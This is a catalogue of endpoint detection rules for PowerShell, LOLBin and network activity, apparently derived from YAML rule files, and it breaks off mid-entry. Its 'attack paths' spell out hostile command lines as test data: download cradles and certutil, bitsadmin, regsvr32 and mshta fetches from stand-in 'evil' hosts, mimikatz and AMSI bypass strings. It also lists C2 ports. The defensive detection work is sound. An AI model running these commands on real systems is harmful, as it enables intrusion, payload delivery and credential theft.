## RULE: PS_ENCODED_CMD_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image ends with powershell.exe AND command_line contains any encoded-command flag.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "-EncodedCommand" | "-enc " | "-ec "
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: EncodedCommand full flag — image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; command_line=powershell.exe -EncodedCommand SQBFAFgA
  - Path B: Short -enc form — image=...\powershell.exe; command_line=powershell.exe -enc SQBFAFgA
  - Path C: Short -ec form — image=...\powershell.exe; command_line=powershell.exe -ec SQBFAFgA
- TP/FP boundary: Fires on any powershell.exe process create whose command line contains one of the three encoded-command substrings; legitimate admin encoded scripts also match.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_DOWNLOAD_CRADLE_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line has a download cradle keyword AND parent_image is outside known-benign parents.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "DownloadString" | "DownloadFile" | "WebClient" | "Invoke-WebRequest" | "iwr " | "curl " | "wget "
- Optional fields:
  - parent_image: allow_null true — missing parent still satisfies exclusion condition (treated as suspicious)
- Known exclusion conditions:
  - parent_image: not_contains_any "explorer.exe" | "taskeng.exe" | "taskhostw.exe" | "svchost.exe"
- Attack paths (minimum 3):
  - Path A: WebClient DownloadString from cmd — image=...\powershell.exe; command_line=...New-Object Net.WebClient).DownloadString('http://evil/a.ps1'); parent_image=...\cmd.exe
  - Path B: Invoke-WebRequest alias — image=...\powershell.exe; command_line=iwr http://evil/payload.ps1 | iex; parent_image=...\WINWORD.EXE
  - Path C: curl alias cradle — image=...\powershell.exe; command_line=curl http://evil/x.ps1 -o $env:TEMP\x.ps1; parent_image=...\wscript.exe
- TP/FP boundary: TP when PS download keywords appear under non-excluded parents; FP suppressed for explorer/taskeng/taskhostw/svchost parents even with download keywords.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_AMSI_BYPASS_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line references AMSI internals or amsi.dll.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "amsiInitFailed" | "AmsiScanBuffer" | "AmsiUtils" | "amsi.dll"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: amsiInitFailed patch — image=...\powershell.exe; command_line=...amsiInitFailed...
  - Path B: AmsiScanBuffer reference — image=...\powershell.exe; command_line=...AmsiScanBuffer...
  - Path C: AmsiUtils / amsi.dll — image=...\powershell.exe; command_line=...[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')... or ...amsi.dll...
- TP/FP boundary: Any powershell.exe command line containing AMSI-related substrings fires; no parent or context exclusions.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_HIDDEN_WINDOW_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line has hidden-window flags AND parent is not a Task Scheduler host.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "-WindowStyle Hidden" | "-W Hidden" | "-WindowStyle H"
- Optional fields:
  - parent_image: allow_null true — missing parent still satisfies exclusion condition
- Known exclusion conditions:
  - parent_image: not_contains_any "taskeng.exe" | "taskhostw.exe" | "svchost.exe"
- Attack paths (minimum 3):
  - Path A: Full WindowStyle Hidden from cmd — image=...\powershell.exe; command_line=powershell.exe -WindowStyle Hidden -File x.ps1; parent_image=...\cmd.exe
  - Path B: Short -W Hidden — image=...\powershell.exe; command_line=powershell.exe -W Hidden -c ...; parent_image=...\WINWORD.EXE
  - Path C: Abbreviated -WindowStyle H — image=...\powershell.exe; command_line=powershell.exe -WindowStyle H ...; parent_image=...\wscript.exe
- TP/FP boundary: TP for hidden-window PS from non-scheduler parents; FP suppressed when parent is taskeng/taskhostw/svchost.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_EXECUTION_POLICY_BYPASS_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line contains execution-policy bypass/unrestricted flags.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "-executionpolicy bypass" | "-ep bypass" | "-executionpolicy unrestricted"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Full Bypass — image=...\powershell.exe; command_line=powershell.exe -ExecutionPolicy Bypass -File evil.ps1
  - Path B: Short -ep bypass — image=...\powershell.exe; command_line=powershell.exe -ep bypass -c ...
  - Path C: Unrestricted — image=...\powershell.exe; command_line=powershell.exe -ExecutionPolicy Unrestricted -File evil.ps1
- TP/FP boundary: Fires solely on bypass/unrestricted policy flags in powershell.exe command lines; no parent exclusions.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_INVOKE_EXPRESSION_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line contains an IEX/invoke pattern AND a download/decode pattern (both ANDed).
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "invoke-expression" | "iex(" | "iex (" | "|iex" | "| iex" | ".invoke()"
  - command_line: contains_any "frombase64string" | "downloadstring" | "net.webclient" | "webclient" | "downloadfile" | "net.sockets" | "[char[]"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: IEX + DownloadString — image=...\powershell.exe; command_line=IEX (New-Object Net.WebClient).DownloadString('http://evil/a')
  - Path B: Pipe iex + FromBase64String — image=...\powershell.exe; command_line=...FromBase64String... | iex
  - Path C: Invoke-Expression + WebClient — image=...\powershell.exe; command_line=Invoke-Expression (New-Object Net.WebClient).DownloadFile(...)
- TP/FP boundary: Requires co-occurrence of an IEX-family token and a download/decode token; IEX alone does not fire.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_VERSION_DOWNGRADE_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line requests PowerShell version 2.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "-version 2" | "-version 2.0" | "-v 2" | "-ve 2"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: -Version 2 — image=...\powershell.exe; command_line=powershell.exe -Version 2 -c ...
  - Path B: -Version 2.0 — image=...\powershell.exe; command_line=powershell.exe -Version 2.0 -File x.ps1
  - Path C: Short -v 2 / -ve 2 — image=...\powershell.exe; command_line=powershell.exe -v 2 -c ... or -ve 2
- TP/FP boundary: Any powershell.exe launch with an explicit v2 version flag matches; no exclusions.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_REFLECTIVE_ASSEMBLY_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line references .NET reflective Assembly load APIs.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "[system.reflection.assembly]::load" | "[reflection.assembly]::load" | "[reflection.assembly]::loadfile" | "assembly]::loadfrom" | "loadwithpartialname" | "[system.reflection.assembly]::loadfile"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Assembly::Load bytes — image=...\powershell.exe; command_line=...[System.Reflection.Assembly]::Load($bytes)...
  - Path B: LoadFile — image=...\powershell.exe; command_line=...[Reflection.Assembly]::LoadFile('C:\Users\Public\a.dll')...
  - Path C: LoadWithPartialName / LoadFrom — image=...\powershell.exe; command_line=...LoadWithPartialName... or ...Assembly]::LoadFrom...
- TP/FP boundary: Fires on reflective assembly load API substrings in powershell.exe command lines; no path/parent exclusions.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_CREDENTIAL_ACCESS_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line contains credential-dumping tool signatures.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "invoke-mimikatz" | "sekurlsa" | "lsadump" | "out-minidump" | "get-passhashes" | "invoke-credentialinjection" | "mimikatz" | "privilege::debug" | "invoke-dcsync" | "dumpcreds"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Invoke-Mimikatz — image=...\powershell.exe; command_line=...Invoke-Mimikatz...
  - Path B: sekurlsa / privilege::debug — image=...\powershell.exe; command_line=...sekurlsa::logonpasswords... or privilege::debug
  - Path C: Out-Minidump / Invoke-DCSync — image=...\powershell.exe; command_line=...Out-Minidump... or ...Invoke-DCSync...
- TP/FP boundary: Any listed credential-tool substring in a powershell.exe command line fires; no exclusions for legitimate audit tooling.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_CONSTRAINED_LANG_BYPASS_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line references PSLockdownPolicy environment variable.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "__pslockdownpolicy" | "pslockdownpolicy"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Direct __PSLockdownPolicy set — image=...\powershell.exe; command_line=...$env:__PSLockdownPolicy=0...
  - Path B: Short PSLockdownPolicy — image=...\powershell.exe; command_line=...PSLockdownPolicy...
  - Path C: Registry/env probe string — image=...\powershell.exe; command_line=...__pslockdownpolicy...
- TP/FP boundary: Fires on any powershell.exe command line containing PSLockdownPolicy substrings; no exclusions.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: PS_WMI_EXEC_001
- File: rules/definitions/powershell.yaml
- Category: PowerShell
- Detection logic: ProcessCreate where image is powershell.exe AND command_line contains WMI process-execution patterns.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - command_line: contains_any "win32_process" | "invoke-wmimethod" | "get-wmiobject" | "gwmi" | "new-object system.management" | "managementobject" | "[wmiclass]" | "wmic"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Win32_Process Create — image=...\powershell.exe; command_line=...Invoke-WmiMethod -Class Win32_Process -Name Create...
  - Path B: Get-WmiObject / gwmi — image=...\powershell.exe; command_line=...Get-WmiObject Win32_Process... or gwmi ...
  - Path C: [wmiclass] / wmic — image=...\powershell.exe; command_line=...[wmiclass]'\\.\root\cimv2:Win32_Process'... or ...wmic...
- TP/FP boundary: Broad WMI keyword match in powershell.exe command lines; legitimate WMI admin scripts also match.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is powershell.yaml

## RULE: LOLBIN_MSHTA_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image ends with mshta.exe (any command line).
- Required fields to trigger:
  - image: ends_with "mshta.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Remote HTA — image=...\mshta.exe; command_line=mshta.exe http://evil/payload.hta
  - Path B: Inline VBScript — image=...\mshta.exe; command_line=mshta.exe vbscript:Execute("...")
  - Path C: Local HTA — image=...\mshta.exe; command_line=mshta.exe C:\Users\Public\a.hta
- TP/FP boundary: Any mshta.exe process create fires; no command-line or parent filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_RUNDLL32_SUSPICIOUS_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is rundll32.exe AND command_line contains a suspicious protocol/shim/URL pattern.
- Required fields to trigger:
  - image: ends_with "rundll32.exe"
  - command_line: contains_any "javascript:" | "shell32.dll,ShellExec" | "shell32.dll,Control_RunDLL" | "http://" | "https://"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: javascript: protocol — image=...\rundll32.exe; command_line=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...
  - Path B: ShellExec shim — image=...\rundll32.exe; command_line=rundll32.exe shell32.dll,ShellExec_RunDLL ...
  - Path C: Remote URL — image=...\rundll32.exe; command_line=rundll32.exe http://evil/a.dll,Entry or https://evil/a.dll,Entry
- TP/FP boundary: Ordinary dll,EntryPoint rundll32 calls without listed substrings do not fire; javascript/shell32 shim/URL forms do.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_REGSVR32_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is regsvr32.exe AND command_line matches Squiblydoo/remote-script patterns.
- Required fields to trigger:
  - image: ends_with "regsvr32.exe"
  - command_line: contains_any "/i:http" | "/i:https" | "/s /u /i" | "scrobj.dll"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: /i:http Squiblydoo — image=...\regsvr32.exe; command_line=regsvr32.exe /s /i:http://evil/a.sct scrobj.dll
  - Path B: /i:https — image=...\regsvr32.exe; command_line=regsvr32.exe /i:https://evil/a.sct scrobj.dll
  - Path C: scrobj.dll local SCT — image=...\regsvr32.exe; command_line=regsvr32.exe /s /u /i:C:\Users\Public\a.sct scrobj.dll
- TP/FP boundary: Plain regsvr32 DLL registration without listed markers does not fire; remote /i or scrobj.dll patterns do.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_CERTUTIL_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is certutil.exe AND command_line contains download or decode flags.
- Required fields to trigger:
  - image: ends_with "certutil.exe"
  - command_line: contains_any "-decode" | "-decodehex" | "-urlcache" | "-f http" | "-f https"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: urlcache download — image=...\certutil.exe; command_line=certutil.exe -urlcache -split -f http://evil/a.exe C:\Users\Public\a.exe
  - Path B: Base64 decode — image=...\certutil.exe; command_line=certutil.exe -decode encoded.txt payload.exe
  - Path C: decodehex — image=...\certutil.exe; command_line=certutil.exe -decodehex hex.txt payload.bin
- TP/FP boundary: certutil without decode/urlcache/http(s) force flags does not fire; those staging flags do.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_MSIEXEC_REMOTE_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is msiexec.exe AND command_line contains a remote URL/install source pattern.
- Required fields to trigger:
  - image: ends_with "msiexec.exe"
  - command_line: contains_any "http://" | "https://" | "ftp://" | "/i http" | "/i ftp" | "/package http"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: /i http MSI — image=...\msiexec.exe; command_line=msiexec.exe /i http://evil/pkg.msi /qn
  - Path B: https package — image=...\msiexec.exe; command_line=msiexec.exe /package https://evil/pkg.msi
  - Path C: ftp source — image=...\msiexec.exe; command_line=msiexec.exe /i ftp://evil/pkg.msi
- TP/FP boundary: Local MSI installs without URL substrings do not fire; any listed remote URL pattern does.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_ODBCCONF_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is odbcconf.exe AND command_line contains REGSVR action or remote /f URL patterns.
- Required fields to trigger:
  - image: ends_with "odbcconf.exe"
  - command_line: contains_any "regsvr" | "/a {" | "-a {" | "/f http" | "/f ftp"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: REGSVR action — image=...\odbcconf.exe; command_line=odbcconf.exe /a {REGSVR "C:\Users\Public\evil.dll"}
  - Path B: -a { form — image=...\odbcconf.exe; command_line=odbcconf.exe -a {REGSVR ...}
  - Path C: Remote /f http|ftp — image=...\odbcconf.exe; command_line=odbcconf.exe /f http://evil/a.rsp or /f ftp://...
- TP/FP boundary: odbcconf without regsvr/action-brace/remote-/f markers does not fire.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_CMSTP_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image ends with cmstp.exe (any command line).
- Required fields to trigger:
  - image: ends_with "cmstp.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: INF profile install — image=...\cmstp.exe; command_line=cmstp.exe /s C:\Users\Public\evil.inf
  - Path B: Auto-elevate INF — image=...\cmstp.exe; command_line=cmstp.exe /au C:\Temp\payload.inf
  - Path C: Bare launch — image=...\cmstp.exe; command_line=cmstp.exe
- TP/FP boundary: Any cmstp.exe process create fires; no command-line filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_HH_CHM_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is hh.exe AND command_line contains remote URL, javascript, or MSITStore protocol patterns.
- Required fields to trigger:
  - image: ends_with "hh.exe"
  - command_line: contains_any "http://" | "https://" | "javascript:" | "mk:@msitstore:" | "ftp://"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Remote CHM URL — image=...\hh.exe; command_line=hh.exe http://evil/help.chm
  - Path B: javascript: handler — image=...\hh.exe; command_line=hh.exe javascript:...
  - Path C: mk:@MSITStore — image=...\hh.exe; command_line=hh.exe mk:@MSITStore:C:\Users\Public\a.chm::/x.html
- TP/FP boundary: Local hh.exe opening .chm without listed protocol/URL substrings does not fire.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_REGASM_REGSVCS_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image ends with regasm.exe OR regsvcs.exe.
- Required fields to trigger:
  - image: ends_with_any "regasm.exe" | "regsvcs.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: regasm malicious assembly — image=...\regasm.exe; command_line=regasm.exe C:\Users\Public\evil.dll
  - Path B: regsvcs malicious assembly — image=...\regsvcs.exe; command_line=regsvcs.exe C:\Users\Public\evil.dll
  - Path C: Unregister path — image=...\regasm.exe; command_line=regasm.exe /U C:\Users\Public\evil.dll
- TP/FP boundary: Any regasm.exe or regsvcs.exe process create fires; no command-line filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_WMIC_PROCESS_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is wmic.exe AND command_line contains process-create or remote-node WMI patterns.
- Required fields to trigger:
  - image: ends_with "wmic.exe"
  - command_line: contains_any "process call create" | "call create" | "process where" | "/node:" | "win32_process"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: process call create — image=...\wmic.exe; command_line=wmic process call create "cmd.exe /c whoami"
  - Path B: Remote /node: — image=...\wmic.exe; command_line=wmic /node:10.0.0.5 process call create "powershell.exe ..."
  - Path C: win32_process / process where — image=...\wmic.exe; command_line=wmic win32_process call create ... or process where ...
- TP/FP boundary: wmic without listed process/remote markers does not fire; process creation and /node: forms do.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_BITSADMIN_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is bitsadmin.exe AND command_line contains transfer/addfile or URL patterns.
- Required fields to trigger:
  - image: ends_with "bitsadmin.exe"
  - command_line: contains_any "/transfer" | "/addfile" | "http://" | "https://" | "ftp://"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: /transfer job — image=...\bitsadmin.exe; command_line=bitsadmin /transfer job http://evil/a.exe C:\Users\Public\a.exe
  - Path B: /addfile — image=...\bitsadmin.exe; command_line=bitsadmin /addfile job http://evil/a.exe C:\Users\Public\a.exe
  - Path C: ftp URL — image=...\bitsadmin.exe; command_line=bitsadmin /transfer job ftp://evil/a.exe C:\Users\Public\a.exe
- TP/FP boundary: bitsadmin without transfer/addfile/URL substrings does not fire.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_INSTALLUTIL_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image ends with installutil.exe (any command line).
- Required fields to trigger:
  - image: ends_with "installutil.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Install malicious assembly — image=...\InstallUtil.exe; command_line=InstallUtil.exe C:\Users\Public\evil.dll
  - Path B: Uninstall method abuse — image=...\InstallUtil.exe; command_line=InstallUtil.exe /U C:\Users\Public\evil.dll
  - Path C: Bare launch — image=...\InstallUtil.exe; command_line=InstallUtil.exe
- TP/FP boundary: Any installutil.exe process create fires; no command-line filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: LOLBIN_FORFILES_001
- File: rules/definitions/lolbins.yaml
- Category: LOLBins
- Detection logic: ProcessCreate where image is forfiles.exe AND command_line contains shell/script-host spawn markers.
- Required fields to trigger:
  - image: ends_with "forfiles.exe"
  - command_line: contains_any "cmd" | "powershell" | "wscript" | "cscript" | "mshta" | "/c cmd" | "/c powershell"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: /c cmd — image=...\forfiles.exe; command_line=forfiles /p C:\Windows\System32 /m notepad.exe /c cmd /c echo hi
  - Path B: /c powershell — image=...\forfiles.exe; command_line=forfiles /c powershell -c ...
  - Path C: wscript/cscript/mshta — image=...\forfiles.exe; command_line=forfiles /c wscript ... or cscript or mshta
- TP/FP boundary: forfiles without shell/script substrings does not fire; presence of cmd/powershell/wscript/cscript/mshta does.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is lolbins.yaml

## RULE: NET_POWERSHELL_HTTP_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: NetworkConnect where powershell.exe initiates outbound to port 80 or 443 AND destination_hostname is outside known Microsoft/ecosystem domains.
- Required fields to trigger:
  - image: ends_with "powershell.exe"
  - initiated: equals "true"
  - destination_port: regex "^(80|443)$"
- Optional fields:
  - destination_hostname: allow_null true — null/unresolved hostname still satisfies exclusion (IP-direct fires)
- Known exclusion conditions:
  - destination_hostname: not_contains_any ".microsoft.com" | ".windowsupdate.com" | ".powershellgallery.com" | ".office.com" | ".office365.com" | ".windows.com" | ".visualstudio.com" | ".nuget.org" | ".azure.com" | ".live.com"
- Attack paths (minimum 3):
  - Path A: HTTPS to attacker domain — image=...\powershell.exe; initiated=true; destination_port=443; destination_hostname=evil.example.com
  - Path B: HTTP to attacker domain — image=...\powershell.exe; initiated=true; destination_port=80; destination_hostname=cdn.attacker.net
  - Path C: IP-direct (null hostname) — image=...\powershell.exe; initiated=true; destination_port=443; destination_hostname=null
- TP/FP boundary: TP for PS-initiated 80/443 to non-excluded hosts or null hostname; FP suppressed for listed Microsoft/ecosystem hostname substrings.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: NET_SCRIPTING_ENGINE_HTTP_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: NetworkConnect where wscript.exe or cscript.exe initiates outbound to port 80 or 443.
- Required fields to trigger:
  - image: ends_with_any "wscript.exe" | "cscript.exe"
  - initiated: equals "true"
  - destination_port: regex "^(80|443)$"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: wscript HTTPS — image=...\wscript.exe; initiated=true; destination_port=443
  - Path B: cscript HTTP — image=...\cscript.exe; initiated=true; destination_port=80
  - Path C: wscript HTTP — image=...\wscript.exe; initiated=true; destination_port=80
- TP/FP boundary: Any initiated 80/443 connection from wscript/cscript fires; no hostname exclusions.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: NET_LOLBIN_PROCESS_HTTP_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: NetworkConnect where cmd/mshta/rundll32/regsvr32/msiexec initiates outbound to port 80 or 443.
- Required fields to trigger:
  - image: ends_with_any "cmd.exe" | "mshta.exe" | "rundll32.exe" | "regsvr32.exe" | "msiexec.exe"
  - initiated: equals "true"
  - destination_port: regex "^(80|443)$"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: mshta HTTPS — image=...\mshta.exe; initiated=true; destination_port=443
  - Path B: rundll32 HTTP — image=...\rundll32.exe; initiated=true; destination_port=80
  - Path C: cmd HTTPS — image=...\cmd.exe; initiated=true; destination_port=443
- TP/FP boundary: Initiated 80/443 from listed LOLBin/shell images fires with no hostname exclusions.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: NET_SUSPICIOUS_PORT_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: NetworkConnect where any process initiates outbound to a known default C2/post-exploitation port.
- Required fields to trigger:
  - initiated: equals "true"
  - destination_port: regex "^(4444|1337|8888|9999|31337|4545|6666|7777|55555|1234|12345|65535|2222|3333)$"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Metasploit default — initiated=true; destination_port=4444; image=any
  - Path B: Cobalt/custom default — initiated=true; destination_port=8888; image=any
  - Path C: Classic backdoor — initiated=true; destination_port=31337; image=any
- TP/FP boundary: Any initiated connection to the listed ports fires regardless of process image; custom C2 ports outside the list do not.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: NET_LOLBIN_NETWORK_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: NetworkConnect where a high-risk LOLBin initiates any outbound connection (no port restriction).
- Required fields to trigger:
  - image: ends_with_any "mshta.exe" | "regsvr32.exe" | "msiexec.exe" | "installutil.exe" | "cmstp.exe" | "odbcconf.exe" | "regasm.exe" | "regsvcs.exe"
  - initiated: equals "true"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: mshta any outbound — image=...\mshta.exe; initiated=true
  - Path B: regsvr32 any outbound — image=...\regsvr32.exe; initiated=true
  - Path C: installutil any outbound — image=...\installutil.exe; initiated=true
- TP/FP boundary: Any initiated network connect from listed LOLBins fires on any destination port.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: NET_SMB_LATERAL_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: NetworkConnect where a non-system process initiates outbound SMB (445 or 139).
- Required fields to trigger:
  - initiated: equals "true"
  - destination_port: regex "^(445|139)$"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - image: not_contains_any "system" | "svchost.exe" | "lsass.exe" | "services.exe" | "msmpeng.exe" | "wmiprvse.exe"
- Attack paths (minimum 3):
  - Path A: PowerShell SMB — initiated=true; destination_port=445; image=...\powershell.exe
  - Path B: cmd SMB — initiated=true; destination_port=139; image=...\cmd.exe
  - Path C: Custom binary SMB — initiated=true; destination_port=445; image=C:\Users\Public\pivot.exe
- TP/FP boundary: TP for non-excluded images initiating 445/139; FP suppressed when image contains system/svchost/lsass/services/msmpeng/wmiprvse.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: NET_DNS_LONG_QUERY_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: DnsQuery where query_name length is at least 50 characters AND image is not an excluded browser/system process.
- Required fields to trigger:
  - query_name: regex ".{50,}"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - image: not_ends_with_any "chrome.exe" | "msedge.exe" | "firefox.exe" | "iexplore.exe" | "brave.exe" | "SearchApp.exe" | "msmpeng.exe" | "svchost.exe"
- Attack paths (minimum 3):
  - Path A: DNS tunnel from powershell — query_name=<50+ char encoded label>.evil.com; image=...\powershell.exe
  - Path B: DNS tunnel from cmd — query_name=<50+ chars>; image=...\cmd.exe
  - Path C: DNS tunnel from custom binary — query_name=<50+ chars>; image=C:\Users\Public\agent.exe
- TP/FP boundary: Long queries from non-excluded images fire; same-length queries from browsers/SearchApp/msmpeng/svchost are suppressed.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: NET_DNS_SCRIPT_ENGINE_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: DnsQuery where image ends with wscript.exe, cscript.exe, or mshta.exe (any query).
- Required fields to trigger:
  - image: ends_with_any "wscript.exe" | "cscript.exe" | "mshta.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: wscript DNS — image=...\wscript.exe; query_name=any
